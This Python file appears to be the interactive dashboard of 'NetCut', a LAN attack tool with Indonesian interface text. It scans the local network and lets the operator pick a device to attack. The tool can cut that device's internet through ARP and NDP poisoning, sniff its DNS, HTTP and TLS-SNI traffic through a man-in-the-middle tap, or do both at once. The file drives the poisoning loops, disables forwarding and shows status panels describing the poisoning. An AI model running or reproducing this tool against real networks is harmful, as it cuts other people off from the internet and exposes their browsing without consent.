"""Interactive CLI dashboard for NetCut."""

from __future__ import annotations

import platform
import sys
import threading
import time

from netcut.platform_ops import get_interface_label, is_privileged, run_privileged_worker

from rich.align import Align
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Confirm, IntPrompt
from rich.table import Table
from rich.text import Text

from netcut.cutter import ConnectionCutter, CutTarget
from netcut.ipv6 import pick_gateway_ipv6, resolve_ipv6_for_mac
from netcut.monitor import CutStatus, probe_cut_status
from netcut.network import NetworkInfo, detect_network
from netcut.scanner import Device, ScanResult, scan_network
from netcut.sniffer import SniffHit, TargetSniffer
from netcut.verbose import set_verbose, vlog

console = Console()

_BANNER = r"""
         _           _   _
 ___ ___| |_ ___ _ _| |_|_|___ ___
|   | -_|  _|  _| | |  _| |   | . |
|_|_|___|_| |___|___|_| |_|_|_|_  |
                              |___|
""".strip("\n")

_REPO = "https://github.com/eggy4prlnt/netcuting"


def _os_label() -> str:
    system = platform.system()
    if system == "Windows":
        release = platform.release()
        build = platform.version().split(".", 2)
        if release == "10" and len(build) >= 3 and int(build[2]) >= 22000:
            return "Windows 11"
        return f"Windows {release}"
    if system == "Darwin":
        ver, _, _ = platform.mac_ver()
        return f"macOS {ver}" if ver else "macOS"
    if system == "Linux":
        return platform.platform(terse=True) or "Linux"
    return system or sys.platform


def _banner_text() -> Text:
    text = Text()
    for line in _BANNER.splitlines():
        text.append(line + "\n", style="bold red")
    text.append("\n", style="")
    text.append(f"Repo : {_REPO}\n", style="dim cyan")
    text.append(f"OS   : {_os_label()}", style="dim white")
    return text


def _header(net: NetworkInfo) -> Panel:
    text = _banner_text()
    text.append("\n\n", style="")
    text.append(f"Interface : {get_interface_label(net.interface, net.local_ip)}\n", style="cyan")
    text.append(f"Local IP  : {net.local_ip} ({net.local_mac})\n", style="green")
    text.append(f"Gateway   : {net.gateway_ip}\n", style="yellow")
    text.append(f"Subnet    : {net.subnet}", style="dim")
    return Panel(Align.center(text), title="[bold]Network Info[/bold]", border_style="blue")


def _device_table(devices: list[Device], gateway_mac: str) -> Table:
    table = Table(
        title="Devices di Network",
        show_header=True,
        header_style="bold magenta",
        border_style="bright_black",
        expand=True,
    )
    table.add_column("#", style="dim", width=4, justify="right")
    table.add_column("IP Address", style="cyan", min_width=14)
    table.add_column("Name", style="bold white", min_width=16)
    table.add_column("MAC Address", style="green", min_width=17)
    table.add_column("Vendor", style="white", min_width=10)
    table.add_column("Tipe", style="bold yellow", min_width=8, justify="center")
    table.add_column("IPv6", style="magenta", min_width=18)

    table.add_column("Status", justify="center", min_width=8)

    for idx, device in enumerate(devices, start=1):
        if device.is_self:
            status = "[bold blue]YOU[/bold blue]"
        elif device.is_gateway:
            status = "[bold yellow]GATEWAY[/bold yellow]"
        else:
            status = "[green]Online[/green]"

        name = device.hostname or "-"
        if device.ipv6_addresses:
            ipv6_label = device.ipv6_addresses[0]
            if len(device.ipv6_addresses) > 1:
                ipv6_label += f" (+{len(device.ipv6_addresses) - 1})"
        else:
            ipv6_label = "-"

        table.add_row(
            str(idx),
            device.ip,
            name,
            device.mac,
            device.vendor or "-",
            device.device_type,
            ipv6_label,
            status,
        )

    if gateway_mac:
        table.caption = f"Gateway MAC: {gateway_mac}"
    return table


def _append_bool_status(
    text: Text,
    label: str,
    value: bool | None,
    yes: str,
    no: str,
    unknown: str = "?",
) -> None:
    text.append(f"  {label}: ")
    if value is True:
        text.append(f"{yes}\n", style="green")
    elif value is False:
        text.append(f"{no}\n", style="red")
    else:
        text.append(f"{unknown}\n", style="dim")


def _cutting_panel(
    target: Device,
    packets: int,
    elapsed: float,
    status: CutStatus | None,
) -> Panel:
    text = Text()
    text.append("CUTTING ACTIVE\n\n", style="bold red blink")
    text.append(f"Target  : {target.ip}\n", style="cyan")
    if target.hostname:
        text.append(f"Name    : {target.hostname}\n", style="bold white")
    text.append(f"MAC     : {target.mac}\n", style="green")
    text.append(f"Tipe    : {target.device_type}\n", style="bold yellow")
    text.append(f"Vendor  : {target.vendor or '-'}\n", style="white")
    if target.ipv6_addresses:
        text.append(f"IPv6    : {', '.join(target.ipv6_addresses[:2])}", style="magenta")
        if len(target.ipv6_addresses) > 2:
            text.append(f" (+{len(target.ipv6_addresses) - 2})", style="dim")
        text.append("\n", style="")
    text.append(f"Packets : {packets}\n", style="yellow")
    text.append(f"Uptime  : {elapsed:.0f}s\n\n", style="dim")

    if status:
        text.append("Verifikasi attacker:\n", style="bold white")
        _append_bool_status(text, "LAN target", status.lan_up, "Online", "Offline")
        _append_bool_status(text, "ARP poison tgt", status.poison_target, "Aktif", "Tidak")
        _append_bool_status(text, "ARP poison gw", status.poison_gateway, "Aktif", "Tidak")
        if status.target_ipv6:
            _append_bool_status(text, "NDP poison tgt", status.ndp_poison_target, "Aktif", "Tidak")
            _append_bool_status(text, "NDP poison gw", status.ndp_poison_gateway, "Aktif", "Tidak")
        text.append("  Internet        : ")
        if status.internet_cut is True:
            text.append("TERPUTUS\n", style="bold green")
        elif status.internet_cut is False:
            text.append("MASIH AKTIF\n", style="bold red")
        else:
            text.append("Belum pasti (idle)\n", style="dim")
        text.append(
            f"  Out/In v4       : {status.outbound_attempts}/{status.inbound_responses}\n",
            style="dim",
        )
        if status.target_ipv6:
            text.append(
                f"  Out/In v6       : {status.ipv6_outbound_attempts}/{status.ipv6_inbound_responses}\n",
                style="dim",
            )
        text.append(f"  → {status.summary}\n\n", style="yellow")

    if target.ipv6_addresses:
        text.append("Mode: ARP blackhole + NDP poison (dual-stack)\n", style="yellow")
    else:
        text.append("Mode: ARP blackhole (IPv4) + NDP jika IPv6 ditemukan\n", style="yellow")
    text.append("IPv6 privacy/randomized address mungkin tidak terdeteksi\n\n", style="dim")
    text.append("Tekan Ctrl+C untuk stop & restore koneksi target", style="bold white")
    return Panel(Align.center(text), title="[bold red]Cut[/bold red]", border_style="red")


def _sniff_panel(
    target: Device,
    elapsed: float,
    sniff_hits: list[SniffHit],
    *,
    with_cut: bool,
    packets: int = 0,
) -> Panel:
    text = Text()
    title = "Cut + Sniff" if with_cut else "Sniffing"
    text.append(f"{title.upper()}\n\n", style="bold magenta")
    text.append(f"Target  : {target.ip}\n", style="cyan")
    if target.hostname:
        text.append(f"Name    : {target.hostname}\n", style="bold white")
    text.append(f"MAC     : {target.mac}\n", style="green")
    text.append(f"Tipe    : {target.device_type}\n", style="bold yellow")
    text.append(f"Uptime  : {elapsed:.0f}s\n", style="dim")
    if with_cut or packets:
        text.append(f"Poison  : {packets} paket\n\n", style="yellow")
    else:
        text.append("\n", style="")

    text.append("Traffic target (DNS / HTTP / HTTPS-SNI):\n", style="bold white")
    if sniff_hits:
        for hit in reversed(sniff_hits[-12:]):
            text.append(f"  • {hit.label}\n", style="cyan")
    else:
        text.append("  (belum ada — buka browser/app di target)\n", style="dim")

    text.append("\n", style="")
    text.append("Mode: ARP/NDP MITM tap — traffic target lewat mesin ini\n", style="yellow")
    text.append("HTTPS = domain dari TLS SNI (bukan full URL)\n", style="dim")
    text.append("DoH/DoT mungkin tidak muncul di DNS\n\n", style="dim")
    text.append("Tekan Ctrl+C untuk stop", style="bold white")
    return Panel(Align.center(text), title="[bold magenta]Sniff[/bold magenta]", border_style="magenta")


def _select_mode() -> str | None:
    console.print()
    console.print("[bold]Pilih mode:[/bold]")
    console.print("  [red]1[/red]  Cut      — putuskan internet target")
    console.print("  [magenta]2[/magenta]  Sniff    — monitor DNS/HTTP/HTTPS target")
    console.print("  [yellow]3[/yellow]  Keduanya — cut + sniff bersamaan")
    console.print("  [dim]0[/dim]  Scan ulang / batal")
    console.print()

    choice = IntPrompt.ask("Mode", default=0, show_default=False)
    if choice == 0:
        return None
    if choice == 1:
        return "cut"
    if choice == 2:
        return "sniff"
    if choice == 3:
        return "both"
    console.print("[red]Pilihan tidak valid.[/red]")
    return _select_mode()


_MODE_LABELS = {
    "cut": ("Cut Internet", "red"),
    "sniff": ("Sniff Traffic", "magenta"),
    "both": ("Cut + Sniff", "yellow"),
}


def _select_device(devices: list[Device], mode: str) -> Device | None:
    selectable = [d for d in devices if not d.is_self and not d.is_gateway]

    if not selectable:
        console.print("[yellow]Tidak ada device yang bisa ditarget.[/yellow]")
        return None

    label, _ = _MODE_LABELS.get(mode, ("Target", "white"))
    console.print()
    console.print(f"[bold]Pilih target untuk {label}:[/bold]")
    console.print("[dim]Masukkan 0 untuk batal[/dim]")
    console.print()

    choice = IntPrompt.ask("Nomor device", default=0, show_default=False)

    if choice == 0:
        return None

    if choice < 1 or choice > len(devices):
        console.print("[red]Pilihan tidak valid.[/red]")
        return _select_device(devices, mode)

    selected = devices[choice - 1]

    if selected.is_self:
        console.print("[red]Tidak bisa target device sendiri![/red]")
        return _select_device(devices, mode)

    if selected.is_gateway:
        console.print("[red]Tidak bisa target gateway![/red]")
        return _select_device(devices, mode)

    return selected


def _resolve_cut_ipv6(
    target: Device,
    gateway_mac: str,
    interface: str,
) -> tuple[list[str], list[str]]:
    target_ipv6 = resolve_ipv6_for_mac(
        target.mac,
        interface,
        sniff_seconds=1.5,
    )
    if not target_ipv6 and target.ipv6_addresses:
        target_ipv6 = list(target.ipv6_addresses)

    gateway_ipv6 = pick_gateway_ipv6(gateway_mac, interface)
    return target_ipv6, gateway_ipv6


def _combined_panel(
    target: Device,
    packets: int,
    elapsed: float,
    status: CutStatus | None,
    sniff_hits: list[SniffHit],
) -> Panel:
    text = Text()
    text.append("CUT + SNIFF ACTIVE\n\n", style="bold yellow blink")
    text.append(f"Target  : {target.ip}\n", style="cyan")
    if target.hostname:
        text.append(f"Name    : {target.hostname}\n", style="bold white")
    text.append(f"MAC     : {target.mac}\n", style="green")
    text.append(f"Tipe    : {target.device_type}\n", style="bold yellow")
    text.append(f"Packets : {packets}\n", style="yellow")
    text.append(f"Uptime  : {elapsed:.0f}s\n\n", style="dim")

    if status:
        text.append("[ Cut Status ]\n", style="bold red")
        text.append("  Internet        : ")
        if status.internet_cut is True:
            text.append("TERPUTUS\n", style="bold green")
        elif status.internet_cut is False:
            text.append("MASIH AKTIF\n", style="bold red")
        else:
            text.append("Belum pasti\n", style="dim")
        text.append(f"  → {status.summary}\n\n", style="dim")

    text.append("[ Sniff Traffic ]\n", style="bold magenta")
    if sniff_hits:
        for hit in reversed(sniff_hits[-8:]):
            text.append(f"  • {hit.label}\n", style="cyan")
    else:
        text.append("  (belum ada traffic)\n", style="dim")

    text.append("\nTekan Ctrl+C untuk stop & restore", style="bold white")
    return Panel(Align.center(text), title="[bold yellow]Cut + Sniff[/bold yellow]", border_style="yellow")

def _run_cut_only(
    target: Device,
    net: NetworkInfo,
    gateway_mac: str,
) -> None:
    if not gateway_mac:
        console.print("[red]Gateway MAC tidak ditemukan. Scan ulang dulu.[/red]")
        return

    target_ipv6, gateway_ipv6 = _resolve_cut_ipv6(target, gateway_mac, net.interface)
    vlog(1, f"[CUT] {target.ip} ({target.mac})")

    cutter = ConnectionCutter(
        CutTarget(
            ip=target.ip,
            mac=target.mac,
            gateway_ip=net.gateway_ip,
            gateway_mac=gateway_mac,
            interface=net.interface,
            attacker_mac=net.local_mac,
            target_ipv6=target_ipv6,
            gateway_ipv6=gateway_ipv6,
        )
    )
    cutter._ensure_no_forwarding()

    start_time = time.time()
    stop_event = threading.Event()
    status_lock = threading.Lock()
    latest_status: CutStatus | None = None

    def _cut_loop():
        try:
            while not stop_event.is_set():
                cutter.poison_once()
                time.sleep(0.5)
        except Exception:
            pass
        finally:
            cutter.stop()

    def _monitor_loop():
        nonlocal latest_status
        while not stop_event.is_set():
            try:
                result = probe_cut_status(
                    target_ip=target.ip,
                    gateway_ip=net.gateway_ip,
                    subnet=net.subnet,
                    interface=net.interface,
                    target_mac=target.mac,
                    gateway_mac=gateway_mac,
                    target_ipv6=target_ipv6,
                    sniff_seconds=1.5,
                )
                with status_lock:
                    latest_status = result
            except Exception as exc:
                vlog(2, f"Probe gagal: {exc}", style="dim red")
            time.sleep(3)

    thread = threading.Thread(target=_cut_loop, daemon=True)
    monitor_thread = threading.Thread(target=_monitor_loop, daemon=True)
    thread.start()
    monitor_thread.start()

    try:
        with Live(console=console, refresh_per_second=2) as live:
            while thread.is_alive():
                elapsed = time.time() - start_time
                with status_lock:
                    status = latest_status
                live.update(
                    _cutting_panel(target, cutter.packets_sent, elapsed, status)
                )
                time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        thread.join(timeout=5)
        cutter.stop()
        vlog(1, f"[CUT] selesai, {cutter.packets_sent} paket")
        console.print()
        console.print("[green]Cutting dihentikan. Koneksi target sudah di-restore.[/green]")


def _run_sniff_only(
    target: Device,
    net: NetworkInfo,
    gateway_mac: str,
) -> None:
    if not gateway_mac:
        console.print("[red]Gateway MAC tidak ditemukan. Scan ulang dulu.[/red]")
        return

    target_ipv6, gateway_ipv6 = _resolve_cut_ipv6(target, gateway_mac, net.interface)
    vlog(1, f"[SNIFF] {target.ip} ({target.mac}) MITM tap")

    tapper = ConnectionCutter(
        CutTarget(
            ip=target.ip,
            mac=target.mac,
            gateway_ip=net.gateway_ip,
            gateway_mac=gateway_mac,
            interface=net.interface,
            attacker_mac=net.local_mac,
            target_ipv6=target_ipv6,
            gateway_ipv6=gateway_ipv6,
        ),
        mode="tap",
    )
    tapper._configure_ip_stack()

    sniffer = TargetSniffer(
        target_ip=target.ip,
        target_mac=target.mac,
        target_ipv6=target_ipv6,
        interface=net.interface,
    )
    sniffer.start()

    start_time = time.time()
    stop_event = threading.Event()

    def _tap_loop():
        try:
            while not stop_event.is_set():
                tapper.poison_once()
                time.sleep(0.5)
        except Exception:
            pass
        finally:
            tapper.stop()

    tap_thread = threading.Thread(target=_tap_loop, daemon=True)
    tap_thread.start()

    try:
        with Live(console=console, refresh_per_second=2) as live:
            while not stop_event.is_set():
                elapsed = time.time() - start_time
                live.update(
                    _sniff_panel(
                        target,
                        elapsed,
                        sniffer.recent(12),
                        with_cut=False,
                        packets=tapper.packets_sent,
                    )
                )
                time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        sniffer.stop()
        tap_thread.join(timeout=5)
        tapper.stop()
        total = sniffer.total
        vlog(1, f"[SNIFF] selesai, {total} entri / {tapper.packets_sent} poison")
        console.print()
        console.print(
            f"[green]Sniff selesai — {total} domain terdeteksi. ARP cache sudah di-restore.[/green]"
        )


def _run_cut_and_sniff(
    target: Device,
    net: NetworkInfo,
    gateway_mac: str,
) -> None:
    if not gateway_mac:
        console.print("[red]Gateway MAC tidak ditemukan. Scan ulang dulu.[/red]")
        return

    target_ipv6, gateway_ipv6 = _resolve_cut_ipv6(target, gateway_mac, net.interface)
    vlog(1, f"[CUT+SNIFF] {target.ip} ({target.mac})")

    sniffer = TargetSniffer(
        target_ip=target.ip,
        target_mac=target.mac,
        target_ipv6=target_ipv6,
        interface=net.interface,
    )
    sniffer.start()

    cutter = ConnectionCutter(
        CutTarget(
            ip=target.ip,
            mac=target.mac,
            gateway_ip=net.gateway_ip,
            gateway_mac=gateway_mac,
            interface=net.interface,
            attacker_mac=net.local_mac,
            target_ipv6=target_ipv6,
            gateway_ipv6=gateway_ipv6,
        ),
        mode="tap",
        forward=False,
    )
    cutter._configure_ip_stack()

    start_time = time.time()
    stop_event = threading.Event()
    status_lock = threading.Lock()
    latest_status: CutStatus | None = None

    def _cut_loop():
        try:
            while not stop_event.is_set():
                cutter.poison_once()
                time.sleep(0.5)
        except Exception:
            pass
        finally:
            cutter.stop()

    def _monitor_loop():
        nonlocal latest_status
        while not stop_event.is_set():
            try:
                result = probe_cut_status(
                    target_ip=target.ip,
                    gateway_ip=net.gateway_ip,
                    subnet=net.subnet,
                    interface=net.interface,
                    target_mac=target.mac,
                    gateway_mac=gateway_mac,
                    target_ipv6=target_ipv6,
                    sniff_seconds=1.5,
                )
                with status_lock:
                    latest_status = result
            except Exception as exc:
                vlog(2, f"Probe gagal: {exc}", style="dim red")
            time.sleep(3)

    cut_thread = threading.Thread(target=_cut_loop, daemon=True)
    monitor_thread = threading.Thread(target=_monitor_loop, daemon=True)
    cut_thread.start()
    monitor_thread.start()

    try:
        with Live(console=console, refresh_per_second=2) as live:
            while cut_thread.is_alive():
                elapsed = time.time() - start_time
                with status_lock:
                    status = latest_status
                live.update(
                    _combined_panel(
                        target,
                        cutter.packets_sent,
                        elapsed,
                        status,
                        sniffer.recent(12),
                    )
                )
                time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        sniffer.stop()
        cut_thread.join(timeout=5)
        cutter.stop()
        vlog(1, f"[CUT+SNIFF] selesai, {sniffer.total} sniff / {cutter.packets_sent} poison")
        console.print()
        console.print("[green]Session dihentikan. Koneksi target sudah di-restore.[/green]")


def _run_cut_session(
    target: Device,
    net: NetworkInfo,
    gateway_mac: str,
) -> None:
    _run_cut_only(target, net, gateway_mac)


def _run_sniff_session(
    target: Device,
    net: NetworkInfo,
    *,
    with_cut: bool = False,
    enable_sniff: bool = True,
    gateway_mac: str = "",
) -> None:
    """Backward-compatible entry for workers."""
    if with_cut and enable_sniff:
        _run_cut_and_sniff(target, net, gateway_mac)
    elif with_cut:
        _run_cut_only(target, net, gateway_mac)
    else:
        _run_sniff_only(target, net, gateway_mac)


def _dispatch_action(
    target: Device,
    net: NetworkInfo,
    gateway_mac: str,
    verbose: int = 0,
    action: str = "cut",
) -> None:
    handlers = {
        "cut": lambda: _run_cut_only(target, net, gateway_mac),
        "sniff": lambda: _run_sniff_only(target, net, gateway_mac),
        "both": lambda: _run_cut_and_sniff(target, net, gateway_mac),
    }
    handler = handlers.get(action)
    if not handler:
        console.print(f"[red]Mode tidak dikenal: {action}[/red]")
        return

    if not is_privileged():
        with_cut = action in {"cut", "both"}
        with_sniff = action in {"sniff", "both"}
        worker = "netcut.cut_worker" if action == "cut" else "netcut.sniff_worker"
        payload = {
            "target": {
                "ip": target.ip,
                "mac": target.mac,
                "vendor": target.vendor,
                "hostname": target.hostname,
                "ipv6_addresses": target.ipv6_addresses,
                "device_kind": target.device_kind,
                "device_type": target.device_type,
                "is_gateway": target.is_gateway,
                "is_self": target.is_self,
            },
            "net": {
                "interface": net.interface,
                "local_ip": net.local_ip,
                "local_mac": net.local_mac,
                "gateway_ip": net.gateway_ip,
                "gateway_mac": net.gateway_mac,
                "subnet": net.subnet,
            },
            "gateway_mac": gateway_mac,
            "verbose": verbose,
            "action": action,
            "with_cut": with_cut,
            "enable_sniff": with_sniff,
        }
        vlog(1, f"Delegasi [{action}] ke privileged worker ({worker})")
        try:
            run_privileged_worker(worker, payload)
        except RuntimeError as exc:
            console.print(f"[red]{exc}[/red]")
        return

    handler()


def run_dashboard(verbose: int = 0, default_mode: str | None = None) -> None:
    set_verbose(verbose, console)
    vlog(1, f"NetCut start (verbose level {verbose})")

    console.clear()
    console.print(_header_placeholder())
    console.print()

    try:
        net = detect_network()
        vlog(
            1,
            f"Network: iface={net.interface} ip={net.local_ip} gw={net.gateway_ip} subnet={net.subnet}",
        )
    except Exception as exc:
        console.print(f"[red]Gagal detect network: {exc}[/red]")
        sys.exit(1)

    while True:
        console.clear()
        console.print(_header(net))
        console.print()

        with console.status(
            "[bold green]Scanning network & resolving device names...[/bold green]",
            spinner="dots",
        ):
            try:
                vlog(1, f"Scan ARP subnet {net.subnet} via {net.interface}")
                result = scan_network(
                    subnet=net.subnet,
                    interface=net.interface,
                    local_ip=net.local_ip,
                    gateway_ip=net.gateway_ip,
                )
                vlog(
                    1,
                    f"Scan selesai: {len(result.devices)} device, gateway_mac={result.gateway_mac or '-'}",
                )
            except Exception as exc:
                console.print(f"[red]Scan gagal: {exc}[/red]")
                sys.exit(1)

        if not result.devices:
            console.print("[yellow]Tidak ada device ditemukan di network.[/yellow]")
            if not Confirm.ask("Scan ulang?", default=True):
                break
            continue

        console.print(_device_table(result.devices, result.gateway_mac))
        console.print()

        mode = default_mode or _select_mode()
        default_mode = None  # only apply once from CLI flag
        if mode is None:
            if Confirm.ask("Scan ulang?", default=True):
                continue
            break

        target = _select_device(result.devices, mode)
        if target is None:
            continue

        mode_label, mode_color = _MODE_LABELS[mode]
        console.print()
        console.print(
            Panel(
                f"[bold]Mode:[/bold] [{mode_color}]{mode_label}[/{mode_color}]\n"
                f"[bold]Target:[/bold] {target.ip} ({target.mac})\n"
                f"[bold]Tipe:[/bold] {target.device_type}\n"
                f"[bold]IPv6:[/bold] {', '.join(target.ipv6_addresses) if target.ipv6_addresses else '-'}\n"
                f"[bold]Name:[/bold] {target.hostname or '-'}\n"
                f"[bold]Vendor:[/bold] {target.vendor or '-'}",
                title="Konfirmasi",
                border_style=mode_color,
            )
        )

        if not Confirm.ask(f"Jalankan [bold]{mode_label}[/bold]?", default=False):
            continue

        _dispatch_action(target, net, result.gateway_mac, verbose=verbose, action=mode)

        if not Confirm.ask("Kembali ke dashboard?", default=True):
            break

    console.print("[dim]NetCut selesai.[/dim]")


def _header_placeholder() -> Panel:
    return Panel(Align.center(_banner_text()), border_style="blue")
